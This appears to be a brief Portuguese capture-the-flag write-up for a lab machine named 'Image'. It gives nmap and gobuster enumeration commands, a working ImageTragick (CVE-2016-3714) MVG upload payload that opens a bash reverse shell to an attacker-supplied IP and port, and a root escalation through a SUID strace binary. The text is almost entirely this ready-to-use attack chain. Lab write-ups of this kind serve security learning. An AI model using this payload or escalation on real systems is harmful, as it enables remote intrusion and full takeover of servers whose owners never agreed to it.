# Image
> ImageMagick RCE + strace SUID

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Upload de imagens com processamento via ImageMagick.

## Exploração

ImageMagick versão vulnerável (CVE-2016-3714 / ImageTragick):

```
# exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1")'
pop graphic-context
```

Upload do arquivo `.mvg` como imagem → execução de código remoto.

Reverse shell como www-data.

## Escalada de Privilégio

`strace` com bit SUID identificado:

```
find / -perm -4000 2>/dev/null
# /usr/bin/strace
```

```
strace -o /dev/null /bin/bash -p
```

Root obtido.
